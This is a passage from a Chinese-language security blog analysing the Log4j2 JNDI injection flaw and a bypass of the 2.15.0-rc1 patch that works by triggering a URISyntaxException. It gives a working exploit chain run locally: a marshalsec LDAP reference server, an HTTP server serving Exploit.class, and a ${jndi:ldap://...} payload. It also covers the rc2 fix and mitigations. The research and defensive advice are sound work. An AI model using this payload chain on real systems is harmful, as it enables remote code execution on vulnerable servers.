<p><img decoding="async" loading="lazy" alt="image-20211212103319652" src="/assets/images/image-20211212103319652-59738817ab8c38af48001a5ecd02ddae.png" width="1040" height="444" class="img_ev3q"></p>
</li>
<li>
<p>需要一个<code>config</code>的实例，属于<code>org.apache.logging.log4j.core.config.DefaultConfiguration</code>这个类，默认不为<code>null</code></p>
</li>
</ol>
<p>尝试了各种方法修改配置都不行</p>
<div class="language-properties codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-properties codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">log4j2.formatMsgNoLookups=false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log4j2.formatMsgLookups=true</span><br></span></code></pre></div></div>
<p>所以采用了一个暴力的方法，就是在调试的时候动态修改<code>options</code>变量的值</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">options = new String[]{&quot;lookups&quot;}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211212113357847" src="/assets/images/image-20211212113357847-2480f938449039032296954ff128d0db.png" width="2194" height="1264" class="img_ev3q"></p>
<p>可以看到，我们修改过后，再次来到<code>converter.format(event, buf)</code>，此时<code>converter</code>属于<code>MessagePatternConverter.LookupMessagePatternConverter</code>类了，目标达成</p>
<p><img decoding="async" loading="lazy" alt="image-20211212113740541" src="/assets/images/image-20211212113740541-8874cf32039956cc6afaf22d7e8c2a46.png" width="3584" height="2240" class="img_ev3q"></p>
<p>跟进也是我们想要的结果，对<code>${</code>进行定位判断</p>
<p><img decoding="async" loading="lazy" alt="image-20211212114024942" src="/assets/images/image-20211212114024942-dea8d2c4ae61af3096ba36855eb67441.png" width="3584" height="2240" class="img_ev3q"></p>
<p>跟进<code>replaceIn</code>，就又到了常规的<code>substitute</code>了，接下来几步就不再次分析了</p>
<p><img decoding="async" loading="lazy" alt="image-20211212114240100" src="/assets/images/image-20211212114240100-f535b90f871bbc5b3dec71719b37a24d.png" width="2044" height="268" class="img_ev3q"></p>
<p>上面这么多都是解决配置问题，让它使用到我们想要的<code>converter</code>类</p>
<hr>
<p>后面都是和之前类似差不多的，一直到了<code>org.apache.logging.log4j.core.net.JndiManager#lookup</code>，可以看出来加了很大一串<code>try...catch...</code>对我们的payload进行判断，一有不对劲的地方就<code>return null</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211212114948868" src="/assets/images/image-20211212114948868-9acbe67bddfd769776a968dd11e63639.png" width="3584" height="2240" class="img_ev3q"></p>
<p>还是分析一下各个限制</p>
<table><thead><tr><th>变量</th><th>值</th></tr></thead><tbody><tr><td>allowedProtocols</td><td>[java, ldap, ldaps]</td></tr><tr><td>allowedHosts</td><td>[localhost, 127.0.0.1, d4m1tsdeMacBook-Pro.local, fe80:0:0:0:511a:1574:bca8<!-- -->:fa1b<!-- -->%utun3, fe80:0:0:0:5f4b:9388:9617<!-- -->:a34f<!-- -->%utun2, fe80:0:0:0:da80:893a:2c2b:22c9%utun1, fe80:0:0:0:4936:2ec2:ac06:59d0%utun0, fe80:0:0:0:b853:76ff:fec8<!-- -->:ca3a<!-- -->%llw0, fe80:0:0:0:b853:76ff:fec8<!-- -->:ca3a<!-- -->%awdl0, fe80:0:0:0:aede:48ff:fe00:1122%en5, fe80:0:0:0:1421:ea1:4520<!-- -->:c8ab<!-- -->%en0, 192.168.0.106, fe80:0:0:0:0:0:0:1%lo0, 0:0:0:0:0:0:0:1]</td></tr><tr><td>allowedClasses</td><td>[java.lang.Boolean, java.lang.Byte, java.lang.Character, java.lang.Double, java.lang.Float, java.lang.Integer, java.lang.Long, java.lang.Short, java.lang.String]</td></tr></tbody></table>
<p>看似无懈可击，但是却有一个很严重的问题</p>
<p>如果出现<code>URISyntaxException</code>异常，就会直接执行<code>catch</code>，然后就到了<code>this.context.lookup(name)</code>，还是存在<code>JNDI</code>注入</p>
<p>所以我们现在的绕过想法，就是想办法让211行的<code>URI uri = new URI(name);</code>抛出<code>URISyntaxException</code></p>
<p>分析一下这个报错，就可以发现触发的方式还是挺多的</p>
<p><img decoding="async" loading="lazy" alt="image-20211212135244824" src="/assets/images/image-20211212135244824-2f515899665c169f45002d1aa448d025.png" width="1744" height="858" class="img_ev3q"></p>
<p>也可以网上找找，比如：</p>
<p><img decoding="async" loading="lazy" alt="image-20211212134432226" src="/assets/images/image-20211212134432226-c66dd819cd2926b9b06c843c38dd7d4a.png" width="1968" height="228" class="img_ev3q"></p>
<p>试一下</p>
<p><img decoding="async" loading="lazy" alt="image-20211212135845454" src="/assets/images/image-20211212135845454-f60d99bf108301fd8a70857aba4c22e8.png" width="2558" height="1370" class="img_ev3q"></p>
<p>所以绕过方法：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-cp</span><span class="token plain"> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer </span><span class="token string" style="color:#e3116c">&quot;http://127.0.0.1:8000/ #Exploit&quot;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8088</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> http.server </span><span class="token number" style="color:#36acaa">8000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 127.0.0.1 - - [12/Dec/2021 14:04:04] &quot;GET /Exploit.class HTTP/1.1&quot; 200 -</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">${jndi</span><span class="token variable operator" style="color:#393A34">:</span><span class="token variable" style="color:#36acaa">ldap</span><span class="token variable operator" style="color:#393A34">:</span><span class="token variable operator" style="color:#393A34">/</span><span class="token variable operator" style="color:#393A34">/</span><span class="token variable" style="color:#36acaa">127.0.0.1</span><span class="token variable operator" style="color:#393A34">:</span><span class="token variable" style="color:#36acaa">8088</span><span class="token variable operator" style="color:#393A34">/</span><span class="token variable" style="color:#36acaa"> Exploit}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211212140354955" src="/assets/images/image-20211212140354955-216a5b23c67ee847d483a83576fb855d.png" width="3000" height="1536" class="img_ev3q"></p>
<p>结果，绕过成功</p>
<p><img decoding="async" loading="lazy" alt="image-20211212140434079" src="/assets/images/image-20211212140434079-25f298a2ab3d433b05dfb52c42d7715a.png" width="1776" height="728" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="2150-rc2修复">2.15.0-rc2修复<a href="#2150-rc2修复" class="hash-link" aria-label="2.15.0-rc2修复的直接链接" title="2.15.0-rc2修复的直接链接">​</a></h2>
<p><a href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658" target="_blank" rel="noopener noreferrer"><code>Handle URI exception Commit</code></a></p>
<p>从github上提交的代码，可以看出给<code>catch</code>没有<code>return null</code>的问题修复了</p>
<p><img decoding="async" loading="lazy" alt="image-20211212175014608" src="/assets/images/image-20211212175014608-25b6cff2124e82b9b09c55d2b38ceaf7.png" width="2418" height="868" class="img_ev3q"></p>
<p>暂时还没有好的绕过思路，所以先这样吧</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="影响范围">影响范围<a href="#影响范围" class="hash-link" aria-label="影响范围的直接链接" title="影响范围的直接链接">​</a></h2>
<div class="language-log4j2 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-log4j2 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">srping-boot-strater-log4j2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Apache Solr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Apache Flink</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Apache Druid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Apache Struts2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ElasticSearch</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Flume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dubbo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JedisLogstash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Kafka</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="修复建议">修复建议<a href="#修复建议" class="hash-link" aria-label="修复建议的直接链接" title="修复建议的直接链接">​</a></h2>
<ol>
<li>升级Apache Log4j2所有相关应用到最新的 <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2" target="_blank" rel="noopener noreferrer">log4j-2.15.0-rc2</a> 版本</li>
<li>升级JDK版本，建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本，从根源上杜绝大部分常规的JNDI注入</li>
</ol>
<p>临时措施</p>
<ol>
<li>在jvm参数中添加 <code>-Dlog4j2.formatMsgNoLookups=true</code> 【针对 2.10.0 及以上的版本】</li>
<li>系统环境变量中将<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</code>设置为<code>true</code> 【针对 2.10.0 及以上的版本】</li>
<li>创建“<code>log4j2.component.properties</code>”文件，文件中增加配置“<code>log4j2.formatMsgNoLookups=true</code>” 【针对 2.10.0 及以上的版本】</li>
<li>限制受影响应用对外访问互联网</li>
</ol></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-14T04:13:25.000Z" itemprop="dateModified">2025年6月14日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson1.2.68分析"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Fastjson1.2.68分析</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/代码审计/Java安全/应用漏洞分析/IDEA远程调试Shiro550"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">IDEA远程调试Shiro550</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#前言" class="table-of-contents__link toc-highlight">前言</a></li><li><a href="#复现" class="table-of-contents__link toc-highlight">复现</a><ul><li><a href="#pomxml" class="table-of-contents__link toc-highlight">pom.xml</a></li><li><a href="#启动jndi注入server" class="table-of-contents__link toc-highlight">启动JNDI注入Server</a></li><li><a href="#漏洞代码" class="table-of-contents__link toc-highlight">漏洞代码</a></li><li><a href="#效果" class="table-of-contents__link toc-highlight">效果</a></li></ul></li><li><a href="#分析" class="table-of-contents__link toc-highlight">分析</a><ul><li><a href="#调用栈" class="table-of-contents__link toc-highlight">调用栈</a></li><li><a href="#debug分析" class="table-of-contents__link toc-highlight">Debug分析</a></li><li><a href="#总结" class="table-of-contents__link toc-highlight">总结</a></li></ul></li><li><a href="#一个小坑" class="table-of-contents__link toc-highlight">一个小坑</a></li><li><a href="#常规绕过" class="table-of-contents__link toc-highlight">常规绕过</a><ul><li><a href="#多个执行流程" class="table-of-contents__link toc-highlight">多个$执行流程</a></li><li><a href="#分隔符" class="table-of-contents__link toc-highlight">分隔符</a></li><li><a href="#其他解析器功效" class="table-of-contents__link toc-highlight">其他解析器功效</a></li><li><a href="#绕过思路" class="table-of-contents__link toc-highlight">绕过思路</a></li><li><a href="#奇淫技巧" class="table-of-contents__link toc-highlight">奇淫技巧</a></li></ul></li><li><a href="#2150-rc1补丁绕过" class="table-of-contents__link toc-highlight">2.15.0-rc1补丁绕过</a></li><li><a href="#2150-rc2修复" class="table-of-contents__link toc-highlight">2.15.0-rc2修复</a></li><li><a href="#影响范围" class="table-of-contents__link toc-highlight">影响范围</a></li><li><a href="#修复建议" class="table-of-contents__link toc-highlight">修复建议</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>